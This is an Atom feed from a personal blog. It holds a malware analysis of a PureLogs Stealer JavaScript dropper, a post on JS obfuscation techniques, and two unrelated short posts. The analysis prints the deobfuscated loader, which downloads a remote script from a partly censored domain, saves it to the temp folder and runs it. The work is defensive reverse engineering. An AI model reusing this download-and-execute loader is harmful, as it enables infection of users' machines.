<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-05T15:29:50-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hanleyjames.github.io</title><subtitle>A blog about software engineering and books</subtitle><entry><title type="html">PureLogs Stealer</title><link href="http://localhost:4000/PureLogStealer" rel="alternate" type="text/html" title="PureLogs Stealer" /><published>2024-05-05T05:50:00-06:00</published><updated>2024-05-05T05:50:00-06:00</updated><id>http://localhost:4000/PureLogStealer</id><content type="html" xml:base="http://localhost:4000/PureLogStealer">&lt;p&gt;MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082&lt;/p&gt;

&lt;h1 id=&quot;about&quot;&gt;About&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.purelogs&quot;&gt;“PureLogs, also known as PureLog Stealer, is an infostealer malware from the Pure family that aims to steal sensitive information from infected devices.”&lt;/a&gt;. My general knowledge of the Purelogs family is limited. If you’re looking for something detailed about PureLog/PureLogs/PureLogs Stealer there is a wonderful writeup on Any.Run by &lt;a href=&quot;https://any.run/cybersecurity-blog/pure-malware-family-analysis/&quot;&gt;khr0x, Jane &amp;amp; Maksim Mikhailov&lt;/a&gt;. It’s worth reading so I would recommend checking it out. I will be walking through the file listed with the hash above.
The JS file itself looks like the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogStealer-1.JPG&quot; alt=&quot;PureLogsStealer1&quot; title=&quot;PureLogs Stealer1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-overview&quot;&gt;Initial Overview&lt;/h3&gt;

&lt;p&gt;This relatively small file and at first glance, its approach seems pretty straightforward. We’re building a string with the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode&quot;&gt;stactic method&lt;/a&gt; on the String object.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String.fromCharCode(...)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This large method builds a really large string and hides the UTF-16 character codes. The author takes a number, variable U1s (258393352), and subtracts a larger number to get a set of UTF-16 character codes. In the example below we can see that the first three letters come out to be ‘t’ ‘r’ ‘y’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-2.JPG&quot; alt=&quot;PureLogsStealer2&quot; title=&quot;PureLogs Stealer2&quot; /&gt;
&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-3.jpg&quot; alt=&quot;PureLogsStealer3&quot; title=&quot;PureLogs Stealer3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After this string is built and then stored in a variable, the author calls &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;eval()&lt;/a&gt; to build the initial JS payload.&lt;/p&gt;

&lt;h3 id=&quot;payload&quot;&gt;Payload&lt;/h3&gt;

&lt;p&gt;The following string is the actual JS that is used to drop a secondary file and .Net code eventually. I have cleaned up some variable names and censored the domain name to prevent someone from accidentally following the link.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    try{
        var Object = new ActiveXObject(&apos;MSXML2.XMLHTTP&apos;)
        Object.Open(&apos;GET&apos;,
            &apos;https://postutopia.***/wp-includes/images/smilies/wp.js&apos;,
            false             )
        Object.Send()
        var axo = new ActiveXObject(&apos;Scripting.FileSystemObject&apos;)
        var filepath = axo.GetSpecialFolder(2) + &apos;/IDWYPJ.js&apos;

        if (Object.Status == 200){
            var Stream = new ActiveXObject(&apos;ADODB.Stream&apos;)
            Stream.Open()
            Stream.Type = 1
            Stream.Write(Object.ResponseBody)
            Stream.Position = 0
            Stream.SaveToFile(filepath, 2)                 Stream.Close()
            var WshShell = new ActiveXObject(&apos;WScript.Shell&apos;)
            var oRun = WshShell.Run(filepath)             }
    } catch(e) {}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file works by checking for the existence of this wp.js file stored. It then sends this get request and creates an ActiveXObject (axo), this is used to get the file path to the temporary directory and the file we’re creating. If the GET request is successful we write the wp.js file and save it (if it already exists we overwrite it). Last we created one more ActiveXObject to run the dropped wp.js, now named IDWYPJ.js file. This new file then drops an EXE and creates a few files in the temp directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio.exe&lt;/code&gt;, which looks to be an AsyncRAT.&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This sample of malware was not particularly interesting in terms of JS and what it did to obscure its intent. Its primary payload was only novel in the sense that it used String.fromCharCode, but it was not so obscure, that it was hard to figure out immediately what was going on. It then delivered the main JS in this String of CharCodes that it calls eval on. To read more about the malware itself and its full lifecycle, you can &lt;a href=&quot;https://www.joesandbox.com/analysis/1430766/0/html&quot;&gt;follow that here&lt;/a&gt;. This was probably one of the easier samples I had an opportunity to mess around with.&lt;/p&gt;</content><author><name>James Hanley</name></author><category term="Malware" /><category term="JS" /><summary type="html">MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082</summary></entry><entry><title type="html">JS Malware Obsfucation</title><link href="http://localhost:4000/js-malware-obsfucation" rel="alternate" type="text/html" title="JS Malware Obsfucation" /><published>2024-05-04T05:00:00-06:00</published><updated>2024-05-04T05:00:00-06:00</updated><id>http://localhost:4000/js-malware-obsfucation</id><content type="html" xml:base="http://localhost:4000/js-malware-obsfucation">&lt;h2 id=&quot;obfuscation&quot;&gt;Obfuscation&lt;/h2&gt;
&lt;p&gt;An integral part of malware development or at least trying to figure it out centers around a practice called &lt;a href=&quot;https://en.wikipedia.org/wiki/Obfuscation_(software)&quot;&gt;Obfuscation&lt;/a&gt;. Obfuscation is &lt;a href=&quot;https://en.wiktionary.org/wiki/obfuscation#English&quot;&gt;‘[t]he alteration of computer code to preserve its behavior while concealing its structure and intent’.&lt;/a&gt;. Deobfuscation is the process of turning unreadable, or comically obscure code into something readable. To me, the practice of doing it in Javascript is interesting because it seems like the last language you would want to use if you’re developing malware. Out of this line of thinking, I wanted to spend time exploring how JS malware operates and how people use JS to infect machines.&lt;/p&gt;

&lt;h3 id=&quot;how-are-js-viruses-launched&quot;&gt;How are JS Viruses launched?&lt;/h3&gt;
&lt;p&gt;Primarily JS Malware uses &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10)&quot;&gt;Windows Script Host/WSH&lt;/a&gt; to do the majority of the work. Most people who write these viruses are not using NodeJS itself to do anything. WSH launches a Javascript file and then depending on the use, they either use WSH to write files or &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/desktop/automat/activex-objects&quot;&gt;ActiveXObjects&lt;/a&gt; to write files. I am open to being proven wrong, but at the moment I cannot find one that targets Unix systems as a single JS file itself. With this in mind, we can move on to what I think is the more interesting part of this conversation. What techniques are commonly used to make these files unreadable&lt;/p&gt;

&lt;h2 id=&quot;how-do-malware-authors-mask-intent-or-structure&quot;&gt;How do malware authors mask intent or structure?&lt;/h2&gt;

&lt;h3 id=&quot;hex-and-unicode&quot;&gt;Hex and Unicode&lt;/h3&gt;

&lt;p&gt;Any set of characters in Hex or Unicode is supported by the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar&quot;&gt;lexical grammar&lt;/a&gt; rules that JS interprets. This has legitimate and ambiguous uses but I would suggest following the lexical grammar link posted earlier. A clear example of how I have seen this used in the wild is:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String[&apos;\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065&apos;].test = function(){
        console.log(&apos;test&apos;);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This creates a prototype function called test, which under the hood is interpreted as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String[&apos;prototype&apos;].test = function(){
        console.log(&apos;test&apos;);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I have also seen this used to hide commands used by WSH or ActiveXObjects.&lt;/p&gt;

&lt;h3 id=&quot;eval&quot;&gt;Eval&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;Eval&lt;/a&gt; is kind of a fun, nasty, and slow way of hiding code. This often uses hex, unicode, base64 decoded strings, or charCodes to hide a payload. We can take a quick look at eval to see how it works. Let’s say I have a string that is a complete block of JS Code. I can run it as the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    eval(&quot;let murr = 1200; console.log(murr);&quot;);
    1200
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have this eval statement that reads a variable called murr and logs it to the console. We then get an output of 1200. Simple enough. How this is used in the wild, is it’s often used to do more dirty work. Any time you see an eval statement, you should have some yellow-to-red flag go up in your head.&lt;/p&gt;

&lt;h3 id=&quot;function-and-variable-bloating&quot;&gt;Function and Variable bloating&lt;/h3&gt;

&lt;p&gt;This is relatively straightforward. Let’s assume I create a ton of variables, that call other variables that do nothing in any meaningful way. You would rightfully assume I am a prick if you had to clean up my mess. This is not unknown to developers in any case. It’s not indicative of malware but poor practices. Now let us also assume I do this with functions as well. I declare them with awful names and then write functions that call functions that might or might not do something useful. This is a layer of fatigue that makes it difficult to clean up. If I saw all of the following in a file, I would assume that the author of this file is trying to do something sneaky.
&lt;img src=&quot;/assets/images/24-5-4-CryptoDrainer.JPG&quot; alt=&quot;CryptoDrainer&quot; title=&quot;CryptoDrainer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;comment-bloating&quot;&gt;Comment bloating&lt;/h3&gt;

&lt;p&gt;This also is pretty upfront. I have looked at Wikiloader, SSloader, and a few other samples, and they will bloat the code with a lot of comments. These are often just words to fill space or sometimes contain more code to obfuscate the payload further.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-5-4-wikiloader.JPG&quot; alt=&quot;Wikiloader&quot; title=&quot;Wikiloader&quot; /&gt;
&lt;img src=&quot;/assets/images/24-5-4-SSLoad.JPG&quot; alt=&quot;SSload&quot; title=&quot;SSLoad&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;closing-thoughts&quot;&gt;Closing thoughts&lt;/h2&gt;

&lt;p&gt;There are probably other ways that we can think of how code can be made hard to read. I am not assuming that this short post is a universal truth making it a pain in the ass to understand. I do think that this is a generally good rule for what to expect if you choose to do this in your free time. How these are implemented is more interesting than at face value, and that is what I am trying to move towards. Hopefully, this builds an interest in you, the reader, as much as it does me.&lt;/p&gt;</content><author><name>James Hanley</name></author><category term="Malware" /><category term="JS" /><summary type="html">Obfuscation An integral part of malware development or at least trying to figure it out centers around a practice called Obfuscation. Obfuscation is ‘[t]he alteration of computer code to preserve its behavior while concealing its structure and intent’.. Deobfuscation is the process of turning unreadable, or comically obscure code into something readable. To me, the practice of doing it in Javascript is interesting because it seems like the last language you would want to use if you’re developing malware. Out of this line of thinking, I wanted to spend time exploring how JS malware operates and how people use JS to infect machines.</summary></entry><entry><title type="html">New Years and Re-reading Nietzsche</title><link href="http://localhost:4000/new-years-nietzsche" rel="alternate" type="text/html" title="New Years and Re-reading Nietzsche" /><published>2023-12-30T04:00:00-07:00</published><updated>2023-12-30T04:00:00-07:00</updated><id>http://localhost:4000/new-years-nietzsche</id><content type="html" xml:base="http://localhost:4000/new-years-nietzsche">&lt;p&gt;Happy New Years everyone,
I wanted to lay out a general goal for me and re-read through some of the Kaufmann translations of Nietzsche. I had seen some newer distaste for Nietzsche arise and realize it has been close to a decade since I read his works. I am going to start with Thus Spoke and read through the others in chronological order. I would like to afterwords spend some time reading and exploring newer academic critiques of his works. I feel like a lot has changed in 10 years, including peoples attitudes towards Nietzsche.&lt;/p&gt;</content><author><name>James Hanley</name></author><category term="Nietzsche" /><summary type="html">Happy New Years everyone, I wanted to lay out a general goal for me and re-read through some of the Kaufmann translations of Nietzsche. I had seen some newer distaste for Nietzsche arise and realize it has been close to a decade since I read his works. I am going to start with Thus Spoke and read through the others in chronological order. I would like to afterwords spend some time reading and exploring newer academic critiques of his works. I feel like a lot has changed in 10 years, including peoples attitudes towards Nietzsche.</summary></entry><entry><title type="html">Interesting features of Power Automate Custom Connectors</title><link href="http://localhost:4000/welcome" rel="alternate" type="text/html" title="Interesting features of Power Automate Custom Connectors" /><published>2023-12-30T03:00:00-07:00</published><updated>2023-12-30T03:00:00-07:00</updated><id>http://localhost:4000/welcome</id><content type="html" xml:base="http://localhost:4000/welcome">&lt;h2 id=&quot;interesting-features-of-power-automate-custom-connectors&quot;&gt;Interesting features of Power Automate Custom Connectors&lt;/h2&gt;

&lt;p&gt;During the process of migrating Cloud Flows from Dynamics to Salesforce I ran into an issue with data transformation that caused me to look at as many approaches possible. One was transforming 15 &amp;amp; 18 digit SF UIDs to GUIDs. The other was how to do this with minimal modifications to an already existing api endpoint if possible. After a few discussions around having a Flow do heavy lifting and not wanting to work with Functions, I came to spend some time looking at taking advantage of a unique feature of Connectors.
I had never been in a position to look into creating a Connector. To me they’re just something you use to retrieve data in a way that allows someone with minimal experience to apply filters and so on. It turns out that you can also just run C# code. I did not spot a lot of articles or information about this, and the few that did it seems to be a rare use. If for some reason you need to do a bit of heavy lifting and want to keep your work inside of Power Automate and your code is less than 1MB and runs in less than 5 seconds, then this is for you. If you would like to check out Microsoft’s documentation, you can follow &lt;a href=&quot;https://learn.microsoft.com/en-us/connectors/custom-connectors/write-code&quot;&gt;the link here&lt;/a&gt;.
I am still going to cover the steps here in a future update.&lt;/p&gt;</content><author><name>James Hanley</name></author><category term="Power Automate" /><summary type="html">Interesting features of Power Automate Custom Connectors</summary></entry></feed>